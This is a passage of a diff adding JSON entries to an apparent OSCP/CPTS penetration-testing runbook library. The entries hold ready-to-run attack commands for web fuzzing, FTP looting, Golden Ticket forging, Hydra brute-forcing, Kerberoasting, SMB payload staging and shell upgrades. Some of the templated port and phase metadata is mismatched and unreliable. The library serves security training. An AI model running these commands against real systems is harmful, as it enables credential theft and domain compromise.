<li><strong>What attacker gain:</strong> validated findings (access paths, credentials, execution context, or exposure evidence) enabling faster compromise progression.</li>\n  <li><strong>Detection/Defense opsec:</strong> monitor abnormal auth/enumeration bursts, enforce least privilege and hardening baselines, and alert on repeated tool-pattern telemetry.</li>\n</ul>\n\n<p><strong>Core Commands:</strong></p>\n<pre><code>ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u http://&lt;HOST&gt;/FUZZ -ic\nffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/web-extensions.txt:FUZZ -u http://&lt;HOST&gt;/indexFUZZ -ic</code></pre>",
+    "tags": [
+      "oscp-cpts",
+      "phase:initial-access",
+      "domain:web",
+      "tool:ffuf",
+      "focus:web-testing"
+    ]
+  },
+  {
+    "id": "4115c1f1-3147-5e92-a567-f033b73fc6bb",
+    "label": "FFUF Parameter and Value Fuzzing (GET/POST)",
+    "command": "ffuf -w .../burp-parameter-names.txt:FUZZ -u http://<HOST>/admin.php?FUZZ=key -fs <SIZE>\nffuf -w .../burp-parameter-names.txt:FUZZ -u http://<HOST>/admin.php -X POST -d 'FUZZ=key' -H 'Content-Type: application/x-www-form-urlencoded' -fs <SIZE>\nffuf -w ids.txt:FUZZ -u http://<HOST>/admin.php -X POST -d 'id=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -fs <SIZE>",
+    "color": "#dc2626",
+    "description": "<p>This runbook operationalizes <strong>FFUF Parameter and Value Fuzzing (GET/POST)</strong> using <span style=\"color:#ef4444;font-weight:bold;\">#ffuf</span>. It is designed for repeatable, high-signal execution in authorized OSCP/CPTS-style assessments.</p>\n<p>Identifies hidden parameters and exploitable value handling in dynamic endpoints.</p>\n\n<ol>\n  <li><strong>Prepare scope and access:</strong> validate target reachability and select low-noise execution order.</li>\n  <li><strong>Execute core workflow:</strong> run the command chain to produce actionable security outcomes.</li>\n  <li><strong>Validate and operationalize output:</strong> confirm results, capture artifacts, and prepare follow-on actions.</li>\n</ol>\n\n<ul>\n  <li><strong>Tool Location/Source:</strong> primary references are in local source corpus entries linked from <code>runbook-list.md</code>; e.g., <code>docs/sources-runbooks/oscp-cpts/p0/n0xturne-OSCP-Cheat-Sheet-2024/README.md:351; docs/sources-runbooks/oscp-cpts/p0/n0xturne-OSCP-Cheat-Sheet-2024/README.md:357</code>.</li>\n  <li><strong>Attack pre-requisite:</strong> authorized scope, operator shell access, and protocol reachability on <span style=\"color:#3b82f6;font-weight:bold;\">TCP 80</span>, <span style=\"color:#3b82f6;font-weight:bold;\">TCP 443</span>.</li>\n  <li><strong>What attacker gain:</strong> validated findings (access paths, credentials, execution context, or exposure evidence) enabling faster compromise progression.</li>\n  <li><strong>Detection/Defense opsec:</strong> monitor abnormal auth/enumeration bursts, enforce least privilege and hardening baselines, and alert on repeated tool-pattern telemetry.</li>\n</ul>\n\n<p><strong>Core Commands:</strong></p>\n<pre><code>ffuf -w .../burp-parameter-names.txt:FUZZ -u http://&lt;HOST&gt;/admin.php?FUZZ=key -fs &lt;SIZE&gt;\nffuf -w .../burp-parameter-names.txt:FUZZ -u http://&lt;HOST&gt;/admin.php -X POST -d &#x27;FUZZ=key&#x27; -H &#x27;Content-Type: application/x-www-form-urlencoded&#x27; -fs &lt;SIZE&gt;\nffuf -w ids.txt:FUZZ -u http://&lt;HOST&gt;/admin.php -X POST -d &#x27;id=FUZZ&#x27; -H &#x27;Content-Type: application/x-www-form-urlencoded&#x27; -fs &lt;SIZE&gt;</code></pre>",
+    "tags": [
+      "oscp-cpts",
+      "phase:initial-access",
+      "domain:web",
+      "tool:ffuf",
+      "focus:enumeration"
+    ]
+  },
+  {
+    "id": "58915f1f-6d22-5f01-9b08-aba69bf3bf71",
+    "label": "FFUF VHost and Subdomain Discovery",
+    "command": "ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://FUZZ.<DOMAIN>/ -ic\nffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H \"Host: FUZZ.<DOMAIN>\" -u http://<DOMAIN> -c -mc 200",
+    "color": "#dc2626",
+    "description": "<p>This runbook operationalizes <strong>FFUF VHost and Subdomain Discovery</strong> using <span style=\"color:#ef4444;font-weight:bold;\">#ffuf</span>. It is designed for repeatable, high-signal execution in authorized OSCP/CPTS-style assessments.</p>\n<p>Detects virtual hosts and hidden subdomains tied to the same target IP.</p>\n\n<ol>\n  <li><strong>Prepare scope and access:</strong> validate target reachability and select low-noise execution order.</li>\n  <li><strong>Execute core workflow:</strong> run the command chain to produce actionable security outcomes.</li>\n  <li><strong>Validate and operationalize output:</strong> confirm results, capture artifacts, and prepare follow-on actions.</li>\n</ol>\n\n<ul>\n  <li><strong>Tool Location/Source:</strong> primary references are in local source corpus entries linked from <code>runbook-list.md</code>; e.g., <code>docs/sources-runbooks/oscp-cpts/p0/n0xturne-OSCP-Cheat-Sheet-2024/README.md:339; docs/sources-runbooks/oscp-cpts/p0/hackmd-oscp-pen200.md:47</code>.</li>\n  <li><strong>Attack pre-requisite:</strong> authorized scope, operator shell access, and protocol reachability on <span style=\"color:#3b82f6;font-weight:bold;\">TCP 80</span>, <span style=\"color:#3b82f6;font-weight:bold;\">TCP 443</span>.</li>\n  <li><strong>What attacker gain:</strong> validated findings (access paths, credentials, execution context, or exposure evidence) enabling faster compromise progression.</li>\n  <li><strong>Detection/Defense opsec:</strong> monitor abnormal auth/enumeration bursts, enforce least privilege and hardening baselines, and alert on repeated tool-pattern telemetry.</li>\n</ul>\n\n<p><strong>Core Commands:</strong></p>\n<pre><code>ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://FUZZ.&lt;DOMAIN&gt;/ -ic\nffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H &quot;Host: FUZZ.&lt;DOMAIN&gt;&quot; -u http://&lt;DOMAIN&gt; -c -mc 200</code></pre>",
+    "tags": [
+      "oscp-cpts",
+      "phase:initial-access",
+      "domain:web",
+      "tool:ffuf",
+      "focus:enumeration"
+    ]
+  },
+  {
+    "id": "37311c76-243b-5196-b92b-50f5c331e50f",
+    "label": "FTP Anonymous Looting and Mirroring",
+    "command": "ftp anonymous@<IP> <PORT>\nlftp -u anonymous, ftp://<IP> -e \"mirror --verbose --parallel=5 --continue --target-directory ./loot; quit\"",
+    "color": "#dc2626",
+    "description": "<p>This runbook operationalizes <strong>FTP Anonymous Looting and Mirroring</strong> using <span style=\"color:#ef4444;font-weight:bold;\">#ftp</span> , <span style=\"color:#ef4444;font-weight:bold;\">#lftp</span>. It is designed for repeatable, high-signal execution in authorized OSCP/CPTS-style assessments.</p>\n<p>Validates anonymous access and performs recursive pull of exposed artifacts.</p>\n\n<ol>\n  <li><strong>Prepare scope and access:</strong> validate target reachability and select low-noise execution order.</li>\n  <li><strong>Execute core workflow:</strong> run the command chain to produce actionable security outcomes.</li>\n  <li><strong>Validate and operationalize output:</strong> confirm results, capture artifacts, and prepare follow-on actions.</li>\n</ol>\n\n<ul>\n  <li><strong>Tool Location/Source:</strong> primary references are in local source corpus entries linked from <code>runbook-list.md</code>; e.g., <code>docs/sources-runbooks/oscp-cpts/p0/hackmd-oscp-pen200.md:65; docs/sources-runbooks/oscp-cpts/p0/hackmd-oscp-pen200.md:67</code>.</li>\n  <li><strong>Attack pre-requisite:</strong> authorized scope, operator shell access, and protocol reachability on <span style=\"color:#3b82f6;font-weight:bold;\">TCP 80</span>, <span style=\"color:#3b82f6;font-weight:bold;\">TCP 443</span>.</li>\n  <li><strong>What attacker gain:</strong> validated findings (access paths, credentials, execution context, or exposure evidence) enabling faster compromise progression.</li>\n  <li><strong>Detection/Defense opsec:</strong> monitor abnormal auth/enumeration bursts, enforce least privilege and hardening baselines, and alert on repeated tool-pattern telemetry.</li>\n</ul>\n\n<p><strong>Core Commands:</strong></p>\n<pre><code>ftp anonymous@&lt;IP&gt; &lt;PORT&gt;\nlftp -u anonymous, ftp://&lt;IP&gt; -e &quot;mirror --verbose --parallel=5 --continue --target-directory ./loot; quit&quot;</code></pre>",
+    "tags": [
+      "oscp-cpts",
+      "phase:recon",
+      "domain:offensive",
+      "tool:ftp",
+      "focus:enumeration"
+    ]
+  },
+  {
+    "id": "c88a6402-fc99-5164-9907-f0dcb885ffb5",
+    "label": "GPP Credential Discovery (SYSVOL)",
+    "command": "crackmapexec smb -L | grep gpp\ncrackmapexec smb <DC_IP> -u <USER> -p <PASS> -M gpp_autologin",
+    "color": "#dc2626",
+    "description": "<p>This runbook operationalizes <strong>GPP Credential Discovery (SYSVOL)</strong> using <span style=\"color:#ef4444;font-weight:bold;\">#crackmapexec</span>. It is designed for repeatable, high-signal execution in authorized OSCP/CPTS-style assessments.</p>\n<p>Enumerates Group Policy Preference artifacts that may expose stored credentials.</p>\n\n<ol>\n  <li><strong>Prepare scope and access:</strong> validate target reachability and select low-noise execution order.</li>\n  <li><strong>Execute core workflow:</strong> run the command chain to produce actionable security outcomes.</li>\n  <li><strong>Validate and operationalize output:</strong> confirm results, capture artifacts, and prepare follow-on actions.</li>\n</ol>\n\n<ul>\n  <li><strong>Tool Location/Source:</strong> primary references are in local source corpus entries linked from <code>runbook-list.md</code>; e.g., <code>docs/sources-runbooks/oscp-cpts/p0/0x1ceKing-HTB-Certified-Penetration-Testing-Specialist/cheatsheet/Active Directory Enumeration and Attacks.md:304; docs/sources-runbooks/oscp-cpts/p0/0x1ceKing-HTB-Certified-Penetration-Testing-Specialist/cheatsheet/Active Directory Enumeration and Attacks.md:305</code>.</li>\n  <li><strong>Attack pre-requisite:</strong> authorized scope, operator shell access, and protocol reachability on <span style=\"color:#3b82f6;font-weight:bold;\">TCP 445</span>.</li>\n  <li><strong>What attacker gain:</strong> validated findings (access paths, credentials, execution context, or exposure evidence) enabling faster compromise progression.</li>\n  <li><strong>Detection/Defense opsec:</strong> monitor abnormal auth/enumeration bursts, enforce least privilege and hardening baselines, and alert on repeated tool-pattern telemetry.</li>\n</ul>\n\n<p><strong>Core Commands:</strong></p>\n<pre><code>crackmapexec smb -L | grep gpp\ncrackmapexec smb &lt;DC_IP&gt; -u &lt;USER&gt; -p &lt;PASS&gt; -M gpp_autologin</code></pre>",
+    "tags": [
+      "oscp-cpts",
+      "phase:credential-access",
+      "domain:ad",
+      "tool:crackmapexec",
+      "focus:enumeration"
+    ]
+  },
+  {
+    "id": "89c47087-c34c-54fe-8fd6-0e37647fb098",
+    "label": "Gobuster Directory and API Path Discovery",
+    "command": "gobuster dir -u {URL} -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 20 -o gobuster_http\ngobuster dir -u http://SERVER_IP:PORT/directory -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt\ngobuster dir --url IP --wordlist /usr/share/seclists/Discovery/Web-Content/big.txt",
+    "color": "#dc2626",
+    "description": "<p>This runbook operationalizes <strong>Gobuster Directory and API Path Discovery</strong> using <span style=\"color:#ef4444;font-weight:bold;\">#gobuster</span>. It is designed for repeatable, high-signal execution in authorized OSCP/CPTS-style assessments.</p>\n<p>Expands web content attack surface with recursive/broad path brute-force wordlists.</p>\n\n<ol>\n  <li><strong>Prepare scope and access:</strong> validate target reachability and select low-noise execution order.</li>\n  <li><strong>Execute core workflow:</strong> run the command chain to produce actionable security outcomes.</li>\n  <li><strong>Validate and operationalize output:</strong> confirm results, capture artifacts, and prepare follow-on actions.</li>\n</ol>\n\n<ul>\n  <li><strong>Tool Location/Source:</strong> primary references are in local source corpus entries linked from <code>runbook-list.md</code>; e.g., <code>docs/sources-runbooks/oscp-cpts/p0/hackmd-oscp-pen200.md:42; docs/sources-runbooks/oscp-cpts/p0/n0xturne-OSCP-Cheat-Sheet-2024/README.md:333</code>.</li>\n  <li><strong>Attack pre-requisite:</strong> authorized scope, operator shell access, and protocol reachability on <span style=\"color:#3b82f6;font-weight:bold;\">TCP 80</span>, <span style=\"color:#3b82f6;font-weight:bold;\">TCP 443</span>.</li>\n  <li><strong>What attacker gain:</strong> validated findings (access paths, credentials, execution context, or exposure evidence) enabling faster compromise progression.</li>\n  <li><strong>Detection/Defense opsec:</strong> monitor abnormal auth/enumeration bursts, enforce least privilege and hardening baselines, and alert on repeated tool-pattern telemetry.</li>\n</ul>\n\n<p><strong>Core Commands:</strong></p>\n<pre><code>gobuster dir -u {URL} -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 20 -o gobuster_http\ngobuster dir -u http://SERVER_IP:PORT/directory -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt\ngobuster dir --url IP --wordlist /usr/share/seclists/Discovery/Web-Content/big.txt</code></pre>",
+    "tags": [
+      "oscp-cpts",
+      "phase:initial-access",
+      "domain:web",
+      "tool:gobuster",
+      "focus:web-testing"
+    ]
+  },
+  {
+    "id": "2170eaa2-e41a-521f-8a6c-fa35b83ff1af",
+    "label": "Golden Ticket Forging and Validation",
+    "command": "kerberos::golden /user:Administrator /domain:controller.local /sid:S-1-5-21-849420856-2351964222-986696166 /krbtgt:5508500012cc005cf7082a9a89ebdfdf /id:500\nkerberos::golden /domain:<DOMAIN>/sid:<SID> /rc4:<NTLMHASH> /user:<USERNAME> /service:<SERVICE> /target:<RHOST>\nklist",
+    "color": "#dc2626",
+    "description": "<p>This runbook operationalizes <strong>Golden Ticket Forging and Validation</strong> using <span style=\"color:#ef4444;font-weight:bold;\">#kerberos</span>. It is designed for repeatable, high-signal execution in authorized OSCP/CPTS-style assessments.</p>\n<p>Generates forged Kerberos tickets for privileged impersonation and confirms injection success.</p>\n\n<ol>\n  <li><strong>Prepare scope and access:</strong> validate target reachability and select low-noise execution order.</li>\n  <li><strong>Execute core workflow:</strong> run the command chain to produce actionable security outcomes.</li>\n  <li><strong>Validate and operationalize output:</strong> confirm results, capture artifacts, and prepare follow-on actions.</li>\n</ol>\n\n<ul>\n  <li><strong>Tool Location/Source:</strong> primary references are in local source corpus entries linked from <code>runbook-list.md</code>; e.g., <code>docs/sources-runbooks/oscp-cpts/p0/0xsyr0-OSCP/README.md:3397; docs/sources-runbooks/oscp-cpts/p0/0xsyr0-OSCP/README.md:5951</code>.</li>\n  <li><strong>Attack pre-requisite:</strong> authorized scope, operator shell access, and protocol reachability on <span style=\"color:#3b82f6;font-weight:bold;\">TCP/UDP 88</span>.</li>\n  <li><strong>What attacker gain:</strong> validated findings (access paths, credentials, execution context, or exposure evidence) enabling faster compromise progression.</li>\n  <li><strong>Detection/Defense opsec:</strong> monitor abnormal auth/enumeration bursts, enforce least privilege and hardening baselines, and alert on repeated tool-pattern telemetry.</li>\n</ul>\n\n<p><strong>Core Commands:</strong></p>\n<pre><code>kerberos::golden /user:Administrator /domain:controller.local /sid:S-1-5-21-849420856-2351964222-986696166 /krbtgt:5508500012cc005cf7082a9a89ebdfdf /id:500\nkerberos::golden /domain:&lt;DOMAIN&gt;/sid:&lt;SID&gt; /rc4:&lt;NTLMHASH&gt; /user:&lt;USERNAME&gt; /service:&lt;SERVICE&gt; /target:&lt;RHOST&gt;\nklist</code></pre>",
+    "tags": [
+      "oscp-cpts",
+      "phase:credential-access",
+      "domain:ad",
+      "tool:kerberos",
+      "focus:credentials"
+    ]
+  },
+  {
+    "id": "d8792545-3bdf-5485-83af-8542a1beba6e",
+    "label": "Hydra Multi-Protocol Credential Attacks",
+    "command": "hydra -e nsr -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/rockyou.txt ssh://<IP>\nhydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt 192.168.124.46 ftp\nhydra -e nsr -L /Users/CWei/Tool/dirb/wordlists/others/names.txt -p \"{PWD}\" rdp://{IP}",
+    "color": "#dc2626",
+    "description": "<p>This runbook operationalizes <strong>Hydra Multi-Protocol Credential Attacks</strong> using <span style=\"color:#ef4444;font-weight:bold;\">#hydra</span>. It is designed for repeatable, high-signal execution in authorized OSCP/CPTS-style assessments.</p>\n<p>Performs targeted online brute-force/spraying across SSH, FTP, and RDP services.</p>\n\n<ol>\n  <li><strong>Prepare scope and access:</strong> validate target reachability and select low-noise execution order.</li>\n  <li><strong>Execute core workflow:</strong> run the command chain to produce actionable security outcomes.</li>\n  <li><strong>Validate and operationalize output:</strong> confirm results, capture artifacts, and prepare follow-on actions.</li>\n</ol>\n\n<ul>\n  <li><strong>Tool Location/Source:</strong> primary references are in local source corpus entries linked from <code>runbook-list.md</code>; e.g., <code>docs/sources-runbooks/oscp-cpts/p0/hackmd-oscp-pen200.md:165; docs/sources-runbooks/oscp-cpts/p0/hackmd-oscp-pen200.md:167</code>.</li>\n  <li><strong>Attack pre-requisite:</strong> authorized scope, operator shell access, and protocol reachability on <span style=\"color:#3b82f6;font-weight:bold;\">TCP 3389</span>.</li>\n  <li><strong>What attacker gain:</strong> validated findings (access paths, credentials, execution context, or exposure evidence) enabling faster compromise progression.</li>\n  <li><strong>Detection/Defense opsec:</strong> monitor abnormal auth/enumeration bursts, enforce least privilege and hardening baselines, and alert on repeated tool-pattern telemetry.</li>\n</ul>\n\n<p><strong>Core Commands:</strong></p>\n<pre><code>hydra -e nsr -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/rockyou.txt ssh://&lt;IP&gt;\nhydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt 192.168.124.46 ftp\nhydra -e nsr -L /Users/CWei/Tool/dirb/wordlists/others/names.txt -p &quot;{PWD}&quot; rdp://{IP}</code></pre>",
+    "tags": [
+      "oscp-cpts",
+      "phase:lateral-movement",
+      "domain:windows",
+      "tool:hydra",
+      "focus:credentials"
+    ]
+  },
+  {
+    "id": "4f486708-111a-5244-ab58-bb0dc842f32b",
+    "label": "Impacket SMB Server Payload Staging",
+    "command": "impacket-smbserver share . -smb2support\nimpacket-smbserver -smb2support share <FOLDER> -user <USERNAME> -password <PASSWORD>\nimpacket-smbserver -ip 172.16.5.x -smb2support -username user -password password shared /home/administrator/Downloads/",
+    "color": "#dc2626",
+    "description": "<p>This runbook operationalizes <strong>Impacket SMB Server Payload Staging</strong> using <span style=\"color:#ef4444;font-weight:bold;\">#impacket</span>. It is designed for repeatable, high-signal execution in authorized OSCP/CPTS-style assessments.</p>\n<p>Spins up attacker-controlled SMB shares for file transfer and payload delivery during ops.</p>\n\n<ol>\n  <li><strong>Prepare scope and access:</strong> validate target reachability and select low-noise execution order.</li>\n  <li><strong>Execute core workflow:</strong> run the command chain to produce actionable security outcomes.</li>\n  <li><strong>Validate and operationalize output:</strong> confirm results, capture artifacts, and prepare follow-on actions.</li>\n</ol>\n\n<ul>\n  <li><strong>Tool Location/Source:</strong> primary references are in local source corpus entries linked from <code>runbook-list.md</code>; e.g., <code>docs/sources-runbooks/oscp-cpts/p0/0xsyr0-OSCP/README.md:5651; docs/sources-runbooks/oscp-cpts/p0/0xsyr0-OSCP/README.md:5652</code>.</li>\n  <li><strong>Attack pre-requisite:</strong> authorized scope, operator shell access, and protocol reachability on <span style=\"color:#3b82f6;font-weight:bold;\">TCP 445</span>.</li>\n  <li><strong>What attacker gain:</strong> validated findings (access paths, credentials, execution context, or exposure evidence) enabling faster compromise progression.</li>\n  <li><strong>Detection/Defense opsec:</strong> monitor abnormal auth/enumeration bursts, enforce least privilege and hardening baselines, and alert on repeated tool-pattern telemetry.</li>\n</ul>\n\n<p><strong>Core Commands:</strong></p>\n<pre><code>impacket-smbserver share . -smb2support\nimpacket-smbserver -smb2support share &lt;FOLDER&gt; -user &lt;USERNAME&gt; -password &lt;PASSWORD&gt;\nimpacket-smbserver -ip 172.16.5.x -smb2support -username user -password password shared /home/administrator/Downloads/</code></pre>",
+    "tags": [
+      "oscp-cpts",
+      "phase:recon",
+      "domain:ad",
+      "tool:impacket",
+      "focus:enumeration"
+    ]
+  },
+  {
+    "id": "1b4afd13-204c-5bfa-b13a-a984ea800f94",
+    "label": "Interactive Shell Stabilization (TTY Upgrade)",
+    "command": "python3 -c \"import pty;pty.spawn('/bin/bash')\"\npython -c 'import pty; pty.spawn(\"/bin/bash\")'",
+    "color": "#dc2626",
+    "description": "<p>This runbook operationalizes <strong>Interactive Shell Stabilization (TTY Upgrade)</strong> using <span style=\"color:#ef4444;font-weight:bold;\">#python3</span> , <span style=\"color:#ef4444;font-weight:bold;\">#python</span>. It is designed for repeatable, high-signal execution in authorized OSCP/CPTS-style assessments.</p>\n<p>Converts limited shells into stable interactive terminals for post-exploitation.</p>\n\n<ol>\n  <li><strong>Prepare scope and access:</strong> validate target reachability and select low-noise execution order.</li>\n  <li><strong>Execute core workflow:</strong> run the command chain to produce actionable security outcomes.</li>\n  <li><strong>Validate and operationalize output:</strong> confirm results, capture artifacts, and prepare follow-on actions.</li>\n</ol>\n\n<ul>\n  <li><strong>Tool Location/Source:</strong> primary references are in local source corpus entries linked from <code>runbook-list.md</code>; e.g., <code>docs/sources-runbooks/oscp-cpts/p0/hackmd-oscp-pen200.md:525; docs/sources-runbooks/oscp-cpts/p0/lagarian-smith-oscp-cheat-sheet/OSCP_Notes.md:1560</code>.</li>\n  <li><strong>Attack pre-requisite:</strong> authorized scope, operator shell access, and protocol reachability on <span style=\"color:#3b82f6;font-weight:bold;\">TCP 80</span>, <span style=\"color:#3b82f6;font-weight:bold;\">TCP 443</span>.</li>\n  <li><strong>What attacker gain:</strong> validated findings (access paths, credentials, execution context, or exposure evidence) enabling faster compromise progression.</li>\n  <li><strong>Detection/Defense opsec:</strong> monitor abnormal auth/enumeration bursts, enforce least privilege and hardening baselines, and alert on repeated tool-pattern telemetry.</li>\n</ul>\n\n<p><strong>Core Commands:</strong></p>\n<pre><code>python3 -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;\npython -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</code></pre>",
+    "tags": [
+      "oscp-cpts",
+      "phase:recon",
+      "domain:offensive",
+      "tool:python3",
+      "focus:enumeration"
+    ]
+  },
+  {
+    "id": "60668ae2-582c-5217-9c17-6c898d0d8f17",
+    "label": "Kerberoasting Workflow (GetUserSPNs / Rubeus)",
+    "command": "GetUserSPNs.py -dc-ip <DC_IP> <DOMAIN>/<USER> -request-user <SPN_USER> -outputfile tgs_hashes\n./Rubeus.exe kerberoast /outfile:hashes.kerberoast\nhashcat -m 13100 tgs_hashes /usr/share/wordlists/rockyou.txt",
+    "color": "#dc2626",
+    "description": "<p>This runbook operationalizes <strong>Kerberoasting Workflow (GetUserSPNs / Rubeus)</strong> using <span style=\"color:#ef4444;font-weight:bold;\">#getuserspns.py</span> , <span style=\"color:#ef4444;font-weight:bold;\">#rubeus</span> , <span style=\"color:#ef4444;font-weight:bold;\">#hashcat</span>. It is designed for repeatable, high-signal execution in authorized OSCP/CPTS-style assessments.</p>\n<p>Requests service tickets for SPN accounts and cracks TGS hashes offline.</p>\n\n<ol>\n  <li><strong>Prepare scope and access:</strong> validate target reachability and select low-noise execution order.</li>\n  <li><strong>Execute core workflow:</strong> run the command chain to produce actionable security outcomes.</li>\n  <li><strong>Validate and operationalize output:</strong> confirm results, capture artifacts, and prepare follow-on actions.</li>\n</ol>\n\n<ul>\n  <li><strong>Tool Location/Source:</strong> primary references are in local source corpus entries linked from <code>runbook-list.md</code>; e.g., <code>docs/sources-runbooks/oscp-cpts/p0/0x1ceKing-HTB-Certified-Penetration-Testing-Specialist/cheatsheet/Active Directory Enumeration and Attacks.md:164; docs/sources-runbooks/oscp-cpts/p0/hackmd-oscp-pen200.md:434</code>.</li>\n  <li><strong>Attack pre-requisite:</strong> authorized scope, operator shell access, and protocol reachability on <span style=\"color:#3b82f6;font-weight:bold;\">TCP/UDP 88</span>.</li>\n  <li><strong>What attacker gain:</strong> validated findings (access paths, credentials, execution context, or exposure evidence) enabling faster compromise progression.</li>\n  <li><strong>Detection/Defense opsec:</strong> monitor abnormal auth/enumeration bursts, enforce least privilege and hardening baselines, and alert on repeated tool-pattern telemetry.</li>\n</ul>\n\n<p><strong>Core Commands:</strong></p>\n<pre><code>GetUserSPNs.py -dc-ip &lt;DC_IP&gt; &lt;DOMAIN&gt;/&lt;USER&gt; -request-user &lt;SPN_USER&gt; -outputfile tgs_hashes\n.\\Rubeus.exe kerberoast /outfile:hashes.kerberoast\nhashcat -m 13100 tgs_hashes /usr/share/wordlists/rockyou.txt</code></pre>",
+    "tags": [
+      "oscp-cpts",
+      "phase:credential-access",
+      "domain:windows",
+      "tool:getuserspns.py",
+      "focus:credentials"
+    ]
+  },
+  {
+    "id": "9b2ec205-f71e-5930-a1a3-181952ca97e6",
+    "label": "Kerberos ccache Workflow (getTGT + KRB5CCNAME)",
+    "command": "impacket-getTGT <DOMAIN>/<USERNAME>:'<PASSWORD>'\nexport KRB5CCNAME=<FILE>.ccache\nKRB5CCNAME=<FILE>.ccache <APPLICATION>\nklist",
+    "color": "#dc2626",
+    "description": "<p>This runbook operationalizes <strong>Kerberos ccache Workflow (getTGT + KRB5CCNAME)</strong> using <span style=\"color:#ef4444;font-weight:bold;\">#impacket</span> , <span style=\"color:#ef4444;font-weight:bold;\">#export</span> , <span style=\"color:#ef4444;font-weight:bold;\">#krb5ccname</span>. It is designed for repeatable, high-signal execution in authorized OSCP/CPTS-style assessments.</p>\n<p>Acquires Kerberos tickets, binds tooling to ccache files, and validates ticket presence.</p>\n\n<ol>\n  <li><strong>Prepare scope and access:</strong> validate target reachability and select low-noise execution order.</li>\n  <li><strong>Execute core workflow:</strong> run the command chain to produce actionable security outcomes.</li>\n  <li><strong>Validate and operationalize output:</strong> confirm results, capture artifacts, and prepare follow-on actions.</li>\n</ol>\n\n<ul>\n  <li><strong>Tool Location/Source:</strong> primary references are in local source corpus entries linked from <code>runbook-list.md</code>; e.g., <code>docs/sources-runbooks/oscp-cpts/p0/0xsyr0-OSCP/README.md:678; docs/sources-runbooks/oscp-cpts/p0/0xsyr0-OSCP/README.md:679</code>.</li>\n  <li><strong>Attack pre-requisite:</strong> authorized scope, operator shell access, and protocol reachability on <span style=\"color:#3b82f6;font-weight:bold;\">TCP/UDP 88</span>.</li>\n  <li><strong>What attacker gain:</strong> validated findings (access paths, credentials, execution context, or exposure evidence) enabling faster compromise progression.</li>\n  <li><strong>Detection/Defense opsec:</strong> monitor abnormal auth/enumeration bursts, enforce least privilege and hardening baselines, and alert on repeated tool-pattern telemetry.</li>\n</ul>\n\n<p><strong>Core Commands:</strong></p>\n<pre><code>impacket-getTGT &lt;DOMAIN&gt;/&lt;USERNAME&gt;:&#x27;&lt;PASSWORD&gt;&#x27;\nexport KRB5CCNAME=&lt;FILE&gt;.ccache\nKRB5CCNAME=&lt;FILE&gt;.ccache &lt;APPLICATION&gt;\nklist</code></pre>",
+    "tags": [
+      "oscp-cpts",
+      "phase:credential-access",
+      "domain:ad",
+      "tool:impacket",
+      "focus:credentials"
+    ]
+  },
+  {
+    "id": "7767c75c-55c2-5ace-aab5-dcf3afb5a4e4",
+    "label": "Kerbrute User Enumeration for Valid Accounts",
+    "command": "kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt\n./kerbrute userenum -d <DOMAIN> --dc <DOMAIN> /PATH/TO/FILE/<USERNAMES>\nkerbrute userenum --dc IP -d DOMAIN users.txt",
+    "color": "#dc2626",
+    "description": "<p>This runbook operationalizes <strong>Kerbrute User Enumeration for Valid Accounts</strong> using <span style=\"color:#ef4444;font-weight:bold;\">#kerbrute</span>. It is designed for repeatable, high-signal execution in authorized OSCP/CPTS-style assessments.</p>\n<p>Finds valid domain usernames and pre-auth edge cases before spraying/roasting.</p>\n\n<ol>\n  <li><strong>Prepare scope and access:</strong> validate target reachability and select low-noise execution order.</li>\n  <li><strong>Execute core workflow:</strong> run the command chain to produce actionable security outcomes.</li>\n  <li><strong>Validate and operationalize output:</strong> confirm results, capture artifacts, and prepare follow-on actions.</li>\n</ol>\n\n<ul>\n  <li><strong>Tool Location/Source:</strong> primary references are in local source corpus entries linked from <code>runbook-list.md</code>; e.g., <code>docs/sources-runbooks/oscp-cpts/p0/0x1ceKing-HTB-Certified-Penetration-Testing-Specialist/cheatsheet/Active Directory Enumeration and Attacks.md:321; docs/sources-runbooks/oscp-cpts/p0/0xsyr0-OSCP/README.md:3340</code>.</li>\n  <li><strong>Attack pre-requisite:</strong> authorized scope, operator shell access, and protocol reachability on <span style=\"color:#3b82f6;font-weight:bold;\">TCP/UDP 88</span>.</li>\n  <li><strong>What attacker gain:</strong> validated findings (access paths, credentials, execution context, or exposure evidence) enabling faster compromise progression.</li>\n  <li><strong>Detection/Defense opsec:</strong> monitor abnormal auth/enumeration bursts, enforce least privilege and hardening baselines, and alert on repeated tool-pattern telemetry.</li>\n</ul>\n\n<p><strong>Core Commands:</strong></p>\n<pre><code>kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt\n./kerbrute userenum -d &lt;DOMAIN&gt; --dc &lt;DOMAIN&gt; /PATH/TO/FILE/&lt;USERNAMES&gt;\nkerbrute userenum --dc IP -d DOMAIN users.txt</code></pre>",
+    "tags": [
+      "oscp-cpts",
+      "phase:recon",
+      "domain:offensive",
+      "tool:kerbrute",
+      "focus:credentials"
+    ]
+  },
+  {
+    "id": "944d38bf-6712-513b-ba58-794b007b0b87",
+    "label": "LDAP Password Policy and User Extraction",
